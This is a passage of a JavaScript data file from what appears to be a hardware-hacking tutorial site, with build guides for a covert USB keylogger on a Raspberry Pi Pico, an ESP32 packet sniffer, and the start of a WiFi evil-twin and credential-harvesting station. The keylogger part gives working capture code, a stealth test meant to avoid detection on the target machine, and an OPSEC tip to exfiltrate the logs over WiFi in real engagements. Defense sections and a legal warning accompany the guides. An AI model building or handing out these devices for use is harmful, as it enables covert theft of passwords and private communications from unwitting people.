                code: '# Architecture diagram:\n#\n# Real Keyboard ──USB──> Pico PIO-USB Host (GP0/GP1)\n#                              |\n#                              v\n#                        Keystroke Decoder\n#                              |\n#                    +---------+---------+\n#                    |                   |\n#                    v                   v\n#              Log to Flash       Forward to PC\n#              (internal 2MB)     (native USB HID)\n#                                       |\n#                                       v\n#                              Target Computer\n#                         (sees normal keyboard)',
                language: 'Text',
                tip: '<strong>Latency:</strong> The PIO-USB to native USB forwarding adds approximately 1-2ms of latency. This is imperceptible to the user &mdash; typical keyboard polling is 8ms (125Hz) to begin with.'
            },
            {
                title: 'Install the Firmware',
                content: '<p>We use a pre-built firmware that combines PIO-USB host, HID forwarding, and keystroke logging. This project uses the C/C++ SDK for the Pico (not CircuitPython) because PIO-USB requires low-level hardware access.</p>' +
                         '<ol>' +
                         '<li>Install the Pico C SDK and CMake toolchain on your development machine.</li>' +
                         '<li>Clone the pico-usb-keyboard-logger repository (or build from the code below).</li>' +
                         '<li>Build with CMake and flash the resulting UF2 file.</li>' +
                         '</ol>',
                code: '# Install Pico SDK (Linux/macOS)\nsudo apt install cmake gcc-arm-none-eabi libnewlib-arm-none-eabi build-essential\ngit clone https://github.com/raspberrypi/pico-sdk.git --branch master\ncd pico-sdk && git submodule update --init\nexport PICO_SDK_PATH=$(pwd)\n\n# Clone and build the keylogger project\ncd ..\nmkdir keylogger && cd keylogger\n\n# Create CMakeLists.txt and main.c (see next steps)\nmkdir build && cd build\ncmake ..\nmake -j4\n\n# Flash: hold BOOTSEL on Pico, plug in, copy the .uf2 file\ncp keylogger.uf2 /media/$USER/RPI-RP2/',
                language: 'Bash',
                tip: '<strong>Tip:</strong> If you do not want to set up the C toolchain, there are pre-compiled UF2 binaries available on GitHub. Search for "pico-usb-host-hid-logger" for community builds.'
            },
            {
                title: 'Write the Keylogger Core Code',
                content: '<p>The keylogger\'s main loop is straightforward: poll the keyboard for HID reports, decode the keycodes, log them, and forward the raw report to the host computer.</p>',
                code: '// keylogger.c - Core keystroke capture logic\n// (Simplified - actual implementation uses TinyUSB callbacks)\n\n#include <stdio.h>\n#include "pico/stdlib.h"\n#include "bsp/board.h"\n#include "tusb.h"\n#include "pio_usb.h"\n#include "hardware/flash.h"\n\n// Keycode to ASCII lookup table (US layout)\nstatic const char keycode_to_ascii[128] = {\n    0, 0, 0, 0,\n    \'a\', \'b\', \'c\', \'d\', \'e\', \'f\', \'g\', \'h\', \'i\', \'j\',\n    \'k\', \'l\', \'m\', \'n\', \'o\', \'p\', \'q\', \'r\', \'s\', \'t\',\n    \'u\', \'v\', \'w\', \'x\', \'y\', \'z\',\n    \'1\', \'2\', \'3\', \'4\', \'5\', \'6\', \'7\', \'8\', \'9\', \'0\',\n    \'\\n\', 0x1B, \'\\b\', \'\\t\', \' \',\n    \'-\', \'=\', \'[\', \']\', \'\\\\\',\n    0, \';\', \'\\\'\', \'`\', \',\', \'.\', \'/\'\n};\n\n// Flash storage for logged keystrokes\n#define LOG_FLASH_OFFSET (1024 * 1024)  // Start at 1MB into flash\n#define LOG_MAX_SIZE     (1024 * 1024)  // 1MB log buffer\nstatic uint32_t log_write_pos = 0;\nstatic uint8_t log_buffer[4096];  // Write buffer\nstatic uint32_t buf_pos = 0;\n\nvoid log_keystroke(uint8_t keycode, uint8_t modifier) {\n    char c = 0;\n    if (keycode < 128) {\n        c = keycode_to_ascii[keycode];\n    }\n    if (c == 0) return;\n\n    // Apply shift modifier\n    if (modifier & 0x22) {  // Left or Right Shift\n        if (c >= \'a\' && c <= \'z\') c -= 32;  // uppercase\n    }\n\n    // Buffer the character\n    log_buffer[buf_pos++] = c;\n\n    // Flush to flash when buffer is full (4KB = flash sector)\n    if (buf_pos >= 4096) {\n        uint32_t flash_addr = LOG_FLASH_OFFSET + log_write_pos;\n        flash_range_erase(flash_addr, 4096);\n        flash_range_program(flash_addr, log_buffer, 4096);\n        log_write_pos += 4096;\n        buf_pos = 0;\n        if (log_write_pos >= LOG_MAX_SIZE) {\n            log_write_pos = 0;  // Circular buffer\n        }\n    }\n}\n\n// TinyUSB callback: called when a key report arrives\nvoid tuh_hid_report_received_cb(uint8_t dev_addr,\n    uint8_t instance, uint8_t const* report, uint16_t len) {\n\n    // HID keyboard report format:\n    // Byte 0: modifier keys (shift, ctrl, alt, etc.)\n    // Byte 1: reserved\n    // Bytes 2-7: up to 6 simultaneous keycodes\n    uint8_t modifier = report[0];\n    for (int i = 2; i < 8; i++) {\n        if (report[i] != 0) {\n            log_keystroke(report[i], modifier);\n        }\n    }\n\n    // Forward the raw report to the host computer\n    tud_hid_report(0, report, len);\n\n    // Continue receiving\n    tuh_hid_receive_report(dev_addr, instance);\n}',
                language: 'C',
                tip: '<strong>Note:</strong> Writing to flash has a limited number of erase cycles (~100,000 per sector). For long-term logging, use a MicroSD card via SPI instead of the internal flash. The SD card gives you essentially unlimited write cycles for this use case.'
            },
            {
                title: 'Add Log Retrieval',
                content: '<p>You need a way to retrieve the logged keystrokes. Options:</p>' +
                         '<ul>' +
                         '<li><strong>Dev mode (GP15):</strong> When GP15 is grounded at boot, the Pico mounts its internal flash as a USB mass storage device. The log file is accessible as a text file.</li>' +
                         '<li><strong>WiFi exfiltration:</strong> Use a Pico W instead and send logs to a remote server over WiFi (requires the Pico W variant with wireless).</li>' +
                         '<li><strong>Magic key combo:</strong> Program a secret key combination (e.g., Ctrl+Shift+Alt+F12 held for 3 seconds) that triggers log download mode.</li>' +
                         '</ul>',
                code: '# Retrieve logs (when in dev mode - GP15 grounded):\n# 1. Ground GP15 with a jumper wire\n# 2. Plug Pico into your laptop\n# 3. CIRCUITPY or mass storage drive appears\n# 4. Open the log file:\n\ncat /media/$USER/PICOKEY/keylog.txt\n\n# Example log output:\n# [2026-03-19 08:31:02] hello world\n# [2026-03-19 08:31:15] password123\n# [2026-03-19 08:31:28] ssh admin@192.168.1.1\n# [2026-03-19 08:32:01] sudo apt update\n\n# Clear the log:\nrm /media/$USER/PICOKEY/keylog.txt\nsync',
                language: 'Bash',
                tip: '<strong>OPSEC:</strong> In a real engagement, use the WiFi exfiltration method with the Pico W. This eliminates the need to physically retrieve the device, which is the highest-risk part of the operation.'
            },
            {
                title: 'Defense: Detecting and Preventing Hardware Keyloggers',
                content: '<p>Hardware keyloggers are notoriously difficult to detect because they are invisible to software. Here is how organizations defend against them:</p>' +
                         '<ul>' +
                         '<li><strong>Physical inspection:</strong> Regularly inspect USB connections between keyboards and computers. Any device inline between the keyboard cable and the USB port is suspicious. Train cleaning staff and security guards to report unusual USB devices.</li>' +
                         '<li><strong>Tamper-evident seals:</strong> Apply numbered tamper-evident stickers over USB connections. If the seal is broken, the connection was disturbed.</li>' +
                         '<li><strong>USB port monitoring:</strong> Use Sysmon (Event ID 6416) or USBGuard to log device connections. A hardware keylogger adds an extra USB hub or device to the chain &mdash; if a keyboard that usually shows as 1 device suddenly shows as 2, investigate.</li>' +
                         '<li><strong>Wireless keyboards:</strong> Bluetooth and wireless keyboards bypass inline keyloggers (though they introduce wireless interception risks).</li>' +
                         '<li><strong>On-screen keyboards:</strong> For entering high-value credentials, use an on-screen keyboard (Windows: osk.exe). Hardware keyloggers cannot capture mouse clicks on virtual keys.</li>' +
                         '<li><strong>Encrypted keyboards:</strong> Some enterprise keyboards (e.g., Cherry Secure Board) encrypt keystrokes at the keyboard and decrypt them in software, defeating inline capture.</li>' +
                         '</ul>',
                code: '# PowerShell: Enumerate USB device chain\n# A keylogger adds an extra device between keyboard and PC\nGet-PnpDevice -Class USB -Status OK |\n    Select-Object FriendlyName, InstanceId |\n    Format-Table -AutoSize\n\n# Compare device count to baseline:\n# Normal: USB Root Hub > USB Composite Device > HID Keyboard\n# Keylogger: USB Root Hub > USB Hub (EXTRA) > HID Keyboard\n\n# Linux: Check USB device tree\nlsusb -t\n# Look for unexpected hubs or extra devices in the chain\n\n# Physical security checklist:\n# [ ] Keyboard plugged directly into PC (no extensions)\n# [ ] Tamper seal intact on USB connection\n# [ ] No unknown devices between keyboard and port\n# [ ] USB port count matches expected (no hidden hubs)',
                language: 'Bash',
                tip: '<strong>Key insight:</strong> Hardware keyloggers exploit the gap between physical security and software security. No amount of antivirus, EDR, or endpoint hardening will detect a device that operates below the OS layer. Physical security is the only reliable defense.'
            }
        ],

        testing: '<p>Verify your keylogger works correctly:</p>' +
                 '<ul>' +
                 '<li><strong>Passthrough test:</strong> Connect a keyboard through the Pico to a computer. Type normally. All keystrokes should pass through with no noticeable delay. If keys are dropped or laggy, check the PIO-USB configuration.</li>' +
                 '<li><strong>Logging test:</strong> Type a known string ("The quick brown fox..."), then switch to dev mode and check the log. The captured text should match exactly.</li>' +
                 '<li><strong>Special characters:</strong> Test numbers, symbols, shift+key combinations, and modifier keys (Ctrl, Alt). Verify they are logged correctly.</li>' +
                 '<li><strong>Long-duration test:</strong> Leave it running for an hour of normal typing. Check that no keystrokes are lost and the log file is intact.</li>' +
                 '<li><strong>Stealth test:</strong> Check Device Manager on the target machine. Only one keyboard should appear &mdash; not two keyboards or an extra USB hub.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'PIO-USB Pin Conflict',
                description: 'PIO-USB uses GP0 and GP1 by default. If you have anything else wired to these pins, USB host will not work. Keep GP0/GP1 dedicated to the keyboard input.'
            },
            {
                title: 'Power Issues',
                description: 'The keyboard draws power through the Pico. Some power-hungry keyboards (backlit, mechanical with RGB) may draw more current than the Pico can supply through PIO-USB. Use a powered USB hub if needed.'
            }
        ]
    },

    // ========================================================================
    // SG-37: Network Packet Sniffer
    // ========================================================================
    'sg-37': {
        intro: '<p>A network packet sniffer captures and analyzes network traffic in real-time. Commercial tools like the <strong>Hak5 Packet Squirrel</strong> (~$60) are small inline devices that sit between a computer and the network, passively capturing all traffic.</p>' +
               '<p>We build our own using an <strong>ESP32</strong> with a <strong>W5500 Ethernet module</strong>. The ESP32 handles WiFi sniffing (promiscuous mode captures all wireless frames in range), while the W5500 provides wired Ethernet packet capture. Captured packets are stored on a MicroSD card in PCAP format &mdash; directly importable into Wireshark.</p>' +
               '<p>This is a passive reconnaissance tool. It does not send any traffic &mdash; it only listens. In a penetration test, this is the first thing you deploy to understand the network topology, active hosts, protocols in use, and potential vulnerabilities.</p>' +
               '<p><strong>Hardware needed:</strong> ESP32 DevKit, W5500 Ethernet module, MicroSD breakout, SD card, jumper wires, breadboard. Total cost: ~$12.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 320" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '</defs>' +
            '<rect width="720" height="320" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="300" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">NETWORK PACKET SNIFFER &mdash; WIRING DIAGRAM</text>' +
            '<!-- ESP32 -->' +
            '<g class="svg-component">' +
            '<rect x="240" y="55" width="240" height="100" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="240" y="55" width="240" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="360" y="72" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">ESP32 DevKit</text>' +
            '<text x="360" y="95" text-anchor="middle" fill="#8b949e" font-size="8">WiFi promiscuous mode capture</text>' +
            '<text x="360" y="110" text-anchor="middle" fill="#8b949e" font-size="8">SPI bus to W5500 + SD card</text>' +
            '<text x="360" y="130" text-anchor="middle" fill="#8b949e" font-size="8">Web dashboard on AP mode</text>' +
            '</g>' +
            '<!-- W5500 -->' +
            '<rect x="40" y="185" width="180" height="80" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
            '<text x="130" y="210" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">W5500 Ethernet</text>' +
            '<text x="130" y="225" text-anchor="middle" fill="#8b949e" font-size="7">SPI interface</text>' +
            '<text x="130" y="240" text-anchor="middle" fill="#8b949e" font-size="7">RJ45 inline tap</text>' +
            '<text x="130" y="255" text-anchor="middle" fill="#555" font-size="7">10/100 Mbps</text>' +
            '<!-- SD Card -->' +
            '<rect x="500" y="185" width="180" height="80" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="1"/>' +
            '<text x="590" y="210" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">MicroSD Card</text>' +
            '<text x="590" y="225" text-anchor="middle" fill="#8b949e" font-size="7">PCAP file storage</text>' +
            '<text x="590" y="240" text-anchor="middle" fill="#8b949e" font-size="7">FAT32 formatted</text>' +
            '<text x="590" y="255" text-anchor="middle" fill="#555" font-size="7">Wireshark compatible</text>' +
            '<!-- Wires -->' +
            '<line x1="300" y1="155" x2="170" y2="185" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="420" y1="155" x2="550" y2="185" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM\n' +
                '\n' +
                '    ESP32 DevKit          W5500 Ethernet Module\n' +
                '    +------------------+  +------------------+\n' +
                '    |  GPIO23 (MOSI) --|--|-- MOSI            |\n' +
                '    |  GPIO19 (MISO) --|--|-- MISO            |\n' +
                '    |  GPIO18 (SCK)  --|--|-- SCLK            |\n' +
                '    |  GPIO5  (CS)   --|--|-- SCS             |\n' +
                '    |  3V3          --|--|-- VCC             |\n' +
                '    |  GND          --|--|-- GND             |\n' +
                '    +------------------+  +------------------+\n' +
                '\n' +
                '    ESP32 DevKit          MicroSD Breakout\n' +
                '    +------------------+  +------------------+\n' +
                '    |  GPIO23 (MOSI) --|--|-- MOSI            |\n' +
                '    |  GPIO19 (MISO) --|--|-- MISO            |\n' +
                '    |  GPIO18 (SCK)  --|--|-- SCK             |\n' +
                '    |  GPIO4  (CS)   --|--|-- CS              |\n' +
                '    |  3V3          --|--|-- VCC             |\n' +
                '    |  GND          --|--|-- GND             |\n' +
                '    +------------------+  +------------------+\n' +
                '\n' +
                '    Note: W5500 and SD share the SPI bus (MOSI/MISO/SCK)\n' +
                '    but have separate CS (chip select) pins.',

        wiringNotes: '<p><strong>SPI bus sharing:</strong> The W5500 and MicroSD both use SPI. They share MOSI, MISO, and SCK lines, but each has its own Chip Select (CS) pin. Only one device communicates at a time &mdash; the ESP32 toggles CS to select which device to talk to.</p>' +
                     '<p><strong>Promiscuous mode:</strong> The ESP32\'s WiFi radio can be put into promiscuous mode, where it captures all 802.11 frames on a specific channel &mdash; not just frames addressed to it. This is the same capability as monitor mode on a Linux WiFi adapter.</p>' +
                     '<p><strong>PCAP format:</strong> Packets are saved in the standard PCAP file format. This means you can pull the SD card, plug it into your laptop, and open the capture file directly in Wireshark for analysis.</p>',

        steps: [
            {
                title: 'Set Up the Arduino Environment for ESP32',
                content: '<p>Install the ESP32 board support in Arduino IDE:</p>' +
                         '<ol>' +
                         '<li>Open Arduino IDE &rarr; File &rarr; Preferences.</li>' +
                         '<li>Add this URL to Additional Board Manager URLs: <code>https://espressif.github.io/arduino-esp32/package_esp32_index.json</code></li>' +
                         '<li>Go to Tools &rarr; Board Manager, search "esp32", install <strong>esp32 by Espressif Systems</strong>.</li>' +
                         '<li>Select your board: Tools &rarr; Board &rarr; ESP32 Dev Module.</li>' +
                         '<li>Install required libraries via Library Manager: <strong>Ethernet</strong> (for W5500), <strong>SD</strong> (for MicroSD).</li>' +
                         '</ol>',
                code: null,
                language: null,
                tip: '<strong>Tip:</strong> Use Arduino IDE 2.x or PlatformIO in VS Code for better code completion and debugging support. The ESP32 toolchain is large (~500MB) and takes a few minutes to install.'
            },
            {
                title: 'Write the WiFi Sniffer',
                content: '<p>The WiFi sniffer puts the ESP32 into promiscuous mode and captures all 802.11 frames on the current channel. It saves them in PCAP format to the SD card.</p>',
                code: '#include <WiFi.h>\n#include <SD.h>\n#include <SPI.h>\n#include "esp_wifi.h"\n\n#define SD_CS 4\n\n// PCAP file header (global header)\nconst uint8_t pcap_header[] = {\n    0xD4, 0xC3, 0xB2, 0xA1,  // Magic number\n    0x02, 0x00, 0x04, 0x00,  // Version 2.4\n    0x00, 0x00, 0x00, 0x00,  // Timezone (GMT)\n    0x00, 0x00, 0x00, 0x00,  // Timestamp accuracy\n    0xFF, 0xFF, 0x00, 0x00,  // Snap length (65535)\n    0x69, 0x00, 0x00, 0x00   // Link type: 802.11\n};\n\nFile pcapFile;\nuint32_t packetCount = 0;\n\n// Callback for each captured packet\nvoid wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {\n    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;\n    uint32_t len = pkt->rx_ctrl.sig_len;\n    uint32_t ts_sec = millis() / 1000;\n    uint32_t ts_usec = (millis() % 1000) * 1000;\n\n    if (!pcapFile) return;\n\n    // Write PCAP packet header\n    pcapFile.write((uint8_t*)&ts_sec, 4);\n    pcapFile.write((uint8_t*)&ts_usec, 4);\n    pcapFile.write((uint8_t*)&len, 4);\n    pcapFile.write((uint8_t*)&len, 4);\n\n    // Write packet data\n    pcapFile.write(pkt->payload, len);\n    packetCount++;\n\n    // Flush every 100 packets\n    if (packetCount % 100 == 0) {\n        pcapFile.flush();\n        Serial.printf("Captured %d packets\\n", packetCount);\n    }\n}\n\nvoid setup() {\n    Serial.begin(115200);\n\n    // Initialize SD card\n    if (!SD.begin(SD_CS)) {\n        Serial.println("SD card init failed!");\n        return;\n    }\n\n    // Create PCAP file\n    pcapFile = SD.open("/capture.pcap", FILE_WRITE);\n    pcapFile.write(pcap_header, sizeof(pcap_header));\n\n    // Initialize WiFi in promiscuous mode\n    WiFi.mode(WIFI_STA);\n    WiFi.disconnect();\n    esp_wifi_set_promiscuous(true);\n    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);\n    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);\n\n    Serial.println("Sniffer active on channel 6");\n}\n\nvoid loop() {\n    // Channel hopping: cycle through channels 1-13\n    static uint8_t ch = 1;\n    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);\n    ch = (ch % 13) + 1;\n    delay(2000);  // 2 seconds per channel\n}',
                language: 'C++',
                tip: '<strong>Channel hopping:</strong> WiFi uses channels 1-13 (region dependent). The sniffer only captures on one channel at a time. Channel hopping every 2 seconds gives broad coverage but may miss packets during the hop. For targeted capture, lock to the target AP\'s channel.'
            },
            {
                title: 'Add the Ethernet Sniffer',
                content: '<p>The W5500 Ethernet module provides wired packet capture. Connect it inline between a computer and the network (or use a network tap). The ESP32 reads raw Ethernet frames via SPI and logs them alongside WiFi captures.</p>',
                code: '#include <Ethernet.h>\n#include <SD.h>\n\n#define W5500_CS 5\n#define SD_CS 4\n\nbyte mac[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };\n\nvoid setup_ethernet_sniffer() {\n    Ethernet.init(W5500_CS);\n    Ethernet.begin(mac);  // DHCP\n\n    Serial.print("Ethernet IP: ");\n    Serial.println(Ethernet.localIP());\n\n    // Enable promiscuous mode on W5500\n    // (requires modifying W5500 socket register directly)\n    // W5500 Socket 0 in MACRAW mode captures all frames\n}\n\n// Read raw Ethernet frames\nvoid capture_ethernet_packet() {\n    // W5500 MACRAW mode gives us raw Ethernet frames\n    // including the Ethernet header (dst MAC, src MAC, EtherType)\n    // and full payload\n\n    uint8_t buf[1514];  // Max Ethernet frame size\n    int len = 0;\n\n    // Read from W5500 socket in MACRAW mode\n    // (implementation depends on Ethernet library version)\n\n    if (len > 0) {\n        write_pcap_packet(buf, len, 1);  // Link type 1 = Ethernet\n    }\n}',
                language: 'C++',
                tip: '<strong>Note:</strong> The W5500 in MACRAW mode captures all Ethernet frames on the wire, including frames not addressed to it. This is the wired equivalent of WiFi promiscuous mode.'
            },
            {
                title: 'Build a Web Dashboard',
                content: '<p>The ESP32 can run a web server in AP mode, giving you a real-time dashboard accessible from your phone or laptop. The dashboard shows captured packet statistics, detected hosts, and lets you start/stop capture.</p>',
                code: '#include <WiFi.h>\n#include <WebServer.h>\n\nconst char* ap_ssid = "PacketSniff";\nconst char* ap_pass = "changeme123";\n\nWebServer server(80);\n\nvoid handleRoot() {\n    String html = "<html><head><title>Packet Sniffer</title>";\n    html += "<meta name=viewport content=\'width=device-width\'>";\n    html += "<style>body{background:#0a0a0f;color:#ccc;font-family:monospace;padding:20px}";\n    html += "h1{color:#ef4444}.stat{color:#22c55e;font-size:1.2em}</style></head>";\n    html += "<body><h1>Packet Sniffer Dashboard</h1>";\n    html += "<p>Packets captured: <span class=stat>" + String(packetCount) + "</span></p>";\n    html += "<p>Channel: <span class=stat>" + String(currentChannel) + "</span></p>";\n    html += "<p>SD Card: <span class=stat>" + String(SD.totalBytes()/1024/1024) + " MB</span></p>";\n    html += "<p><a href=/start style=color:#22c55e>Start Capture</a> | ";\n    html += "<a href=/stop style=color:#ef4444>Stop Capture</a></p>";\n    html += "</body></html>";\n    server.send(200, "text/html", html);\n}\n\nvoid setup_dashboard() {\n    WiFi.softAP(ap_ssid, ap_pass);\n    server.on("/", handleRoot);\n    server.on("/start", []() {\n        esp_wifi_set_promiscuous(true);\n        server.sendHeader("Location", "/");\n        server.send(302);\n    });\n    server.on("/stop", []() {\n        esp_wifi_set_promiscuous(false);\n        pcapFile.flush();\n        server.sendHeader("Location", "/");\n        server.send(302);\n    });\n    server.begin();\n}',
                language: 'C++',
                tip: '<strong>Tip:</strong> The ESP32 cannot simultaneously sniff in promiscuous mode and serve a web dashboard on the same radio. Use the AP mode for configuration/status, then switch to promiscuous mode for capture. Or use a second ESP32 &mdash; one for sniffing, one for the dashboard.'
            },
            {
                title: 'Defense: Detecting Network Sniffers',
                content: '<p>Network sniffers are passive by design, making them difficult to detect. But "difficult" is not "impossible":</p>' +
                         '<ul>' +
                         '<li><strong>Physical inspection:</strong> Look for unfamiliar devices on the network. Inline sniffers sit between cables and ports. Wireless sniffers are small boxes with antennas.</li>' +
                         '<li><strong>Network traffic encryption:</strong> Use TLS/HTTPS everywhere. A sniffer can capture encrypted traffic, but cannot read the contents. Enforce HSTS to prevent SSL stripping.</li>' +
                         '<li><strong>802.1X / NAC:</strong> Network Access Control requires authentication before granting network access. An unauthorized sniffer plugged into a switch port will not get an IP or see traffic.</li>' +
                         '<li><strong>Switch port security:</strong> Enable port security on managed switches to limit the number of MAC addresses per port. An inline device adds a new MAC.</li>' +
                         '<li><strong>Wireless: monitor for promiscuous mode.</strong> Devices in promiscuous mode respond to any frame, not just frames addressed to their MAC. Nmap\'s <code>--script broadcast-ping</code> can sometimes detect this.</li>' +
                         '<li><strong>DNS-over-HTTPS / VPN:</strong> Encrypt DNS queries and route all traffic through a VPN. Even if traffic is captured, the content is encrypted.</li>' +
                         '</ul>',
                code: '# Detect promiscuous mode on your network (Linux):\nsudo nmap --script broadcast-ping 192.168.1.0/24\n\n# Check your own interface mode:\nip link show wlan0\n# Look for PROMISC flag\n\n# Monitor for ARP anomalies (potential inline device):\nsudo arpwatch -i eth0\n\n# Verify no unknown devices on switch ports (Cisco IOS):\nshow mac address-table\nshow port-security\n\n# Test encryption coverage:\n# Run a capture on your own network and check for unencrypted:\n# - HTTP (not HTTPS)\n# - FTP (not SFTP)\n# - Telnet (not SSH)\n# - SMTP without STARTTLS\n# - DNS (use DoH or DoT)',
                language: 'Bash',
                tip: '<strong>Best defense:</strong> Assume the network is compromised and encrypt everything. Zero Trust architecture eliminates the value of passive sniffing because there is nothing useful to capture in cleartext.'
            }
        ],

        testing: '<p>Verify your packet sniffer works correctly:</p>' +
                 '<ul>' +
                 '<li><strong>SD card writes:</strong> Start a capture, wait 30 seconds, stop. Pull the SD card and verify <code>capture.pcap</code> exists and is not empty.</li>' +
                 '<li><strong>Wireshark validation:</strong> Open the PCAP file in Wireshark. You should see decoded 802.11 frames (beacons, probes, data frames). If Wireshark reports a corrupt file, check the PCAP header bytes.</li>' +
                 '<li><strong>Channel hopping:</strong> Monitor the serial output. You should see channel changes every 2 seconds and the packet count increasing.</li>' +
                 '<li><strong>Dashboard:</strong> Connect to the PacketSniff AP, open 192.168.4.1 in a browser. Verify start/stop controls work and packet count updates.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'SPI Bus Contention',
                description: 'If the W5500 and SD card share SPI but you forget to set separate CS pins, both devices try to talk simultaneously, corrupting data. Double-check that W5500 CS (GPIO5) and SD CS (GPIO4) are on different pins.'
            },
            {
                title: 'SD Card Not FAT32',
                description: 'The Arduino SD library requires FAT32 formatting. Cards larger than 32GB are often formatted as exFAT by default. Reformat the card as FAT32 before use.'
            }
        ]
    },
    // ========================================================================
    // SG-38: Portable WiFi Audit Station
    // ESP32-S3 + 1.8" TFT + MicroSD + LiPo — WiFi Pineapple equivalent
    // ========================================================================
    'sg-38': {

        intro: '<p>The SG-38 is a self-contained, battery-powered WiFi audit station built around the ESP32-S3 microcontroller. It replicates the core capabilities of the Hak5 WiFi Pineapple at roughly 5% of the cost: evil twin access point creation, captive portal credential harvesting, WPA2 handshake capture to SD card, and a full TFT menu system for field operation.</p>' +
               '<p>At its core, the ESP32-S3 runs a dual-role WiFi stack &mdash; one radio scans for nearby networks and targets, the other broadcasts a spoofed AP. A 1.8" SPI TFT display driven by the ST7735 controller provides the menu interface. A MicroSD module logs handshakes, portal credentials, and probe requests as flat files. A TP4056-based LiPo charger circuit provides 3.7V battery operation with USB-C charging.</p>' +
               '<p><strong>Legal requirement:</strong> This device transmits 802.11 RF signals. Operation is restricted to networks you own or have explicit written authorization to test. Using this device against networks without authorization violates the Computer Fraud and Abuse Act (18 U.S.C. &sect; 1030), the Electronic Communications Privacy Act, and equivalent statutes internationally.</p>' +
               '<p><strong>Software options:</strong> Option A is <a href="https://github.com/justcallmekoko/ESP32Marauder" style="color:#ff6b35">ESP32 Marauder</a> (pre-built, feature-complete). Option B is the custom Arduino sketch written from scratch in this guide &mdash; the preferred path for learning the underlying mechanics.</p>',

        wiring: [
            'SG-38 Pin Connections &mdash; ESP32-S3 + ST7735 TFT + MicroSD + TP4056',
            '&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;',
            '',
            '1.8" TFT Display (ST7735 / SPI)',
            'TFT Pin       ESP32-S3 GPIO   Notes',
            'VCC           3.3V            Do NOT connect to 5V',
            'GND           GND',
            'CS            GPIO5           Chip Select (active LOW)',
            'RESET         GPIO17          Pull HIGH to run',
            'DC / RS       GPIO16          Data/Command select',
            'SDA / MOSI    GPIO23          SPI data out',
            'SCK / CLK     GPIO18          SPI clock',
            'LED / BLK     3.3V            Backlight always on',
            '',
            'MicroSD Module (SPI shared bus with TFT, separate CS)',
            'SD Pin        ESP32-S3 GPIO   Notes',
            'VCC           3.3V',
            'GND           GND',
            'CS            GPIO4           Separate CS from TFT',
            'MOSI          GPIO23          Shared SPI bus',
            'SCK           GPIO18          Shared SPI bus',
            'MISO          GPIO19          Shared SPI bus',
            '',
            'TP4056 LiPo Charger Module',
            'TP4056 Pin    Connection      Notes',
            'USB-C / IN+   USB power       Charging input',
            'IN-           USB GND',
            'BAT+ / OUT+   LiPo (+)        3.7V battery positive',
            'BAT- / OUT-   LiPo (-)        Battery negative',
            'OUT+          ESP32 VIN/5V    Or use boost converter',
            '',
            'SPI Bus Summary: SCK=18, MOSI=23, MISO=19 | TFT_CS=5 | SD_CS=4',
            'WARNING: Both TFT and SD share the SPI bus. Always deassert one',
            'CS before asserting the other. Never pull both CS LOW simultaneously.',
        ].join('\n'),

        wiringNotes: '<p><strong>Power note:</strong> The ESP32-S3 draws up to 240mA during active WiFi transmission. Use a LiPo cell of at least 1000mAh for meaningful field runtime. A 2000mAh cell gives approximately 4-5 hours of continuous operation. Use the TP4056 module version that includes the DW01A protection IC (4-pin module with battery protection) &mdash; the version without protection will damage your battery through overdischarge.</p>',

        steps: [
            {
                title: 'Install ESP32 Board Support in Arduino IDE',
                content: '<p>Open Arduino IDE 2.x. Go to <strong>File &rarr; Preferences</strong> and add this URL to "Additional boards manager URLs":</p>' +
                         '<pre style="background:#0d1117;padding:8px;border-radius:4px;color:#8b949e;font-size:0.85rem">https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json</pre>' +
                         '<p>Then go to <strong>Tools &rarr; Board &rarr; Boards Manager</strong>, search "esp32", and install the Espressif Systems package version 2.0.14 or later. After install, select <strong>Board: "ESP32S3 Dev Module"</strong>.</p>',
                tip: 'Upload settings: Board=ESP32S3 Dev Module, Flash Size=4MB, Partition Scheme=Default 4MB with spiffs, Upload Speed=921600. If upload fails, hold the BOOT button while clicking Upload, then release after the "Connecting..." dots appear in the console.'
            },
            {
                title: 'Install Required Libraries',
                content: '<p>In Arduino IDE, open <strong>Sketch &rarr; Include Library &rarr; Manage Libraries</strong> and install:</p>' +
